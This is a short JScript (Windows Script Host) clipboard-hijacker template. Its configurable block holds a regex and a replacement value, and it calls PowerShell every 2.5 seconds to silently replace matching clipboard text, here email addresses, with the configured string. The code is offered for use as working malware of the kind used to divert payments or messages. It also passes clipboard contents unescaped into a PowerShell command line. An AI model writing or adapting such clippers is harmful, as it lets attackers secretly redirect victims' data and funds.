// #START-CONFIG
          //### REPLACE THE objRegEx value with ur regex
          var objRegEx = new RegExp("\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,4}\\b", "ig");
          //### REPLACE your@value.sex with your text to put into clipboard
          var toclip = "your@value.sex"
// #END-CONFIG


        function hasEmailInClipboard() {
            var shell = new ActiveXObject("WScript.Shell");
            var clipboardText = shell.Exec("powershell Get-Clipboard").StdOut.ReadAll();
            
            var objRegEx = new RegExp("\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,4}\\b", "i");
            return objRegEx.test(clipboardText);
        }

        function replaceEmailInClipboard() {
            var shell = new ActiveXObject("WScript.Shell");
            var clipboardText = shell.Exec("powershell Get-Clipboard").StdOut.ReadAll();
            clipboardText = clipboardText.replace(objRegEx, toclip);
            shell.Exec("powershell Set-Clipboard -Value '" + clipboardText + "'");
        }

        function checkClipboard() {
            if (hasEmailInClipboard()) {
                replaceEmailInClipboard();
            }
            setInterval(checkClipboard, 2500);
        }

        checkClipboard();
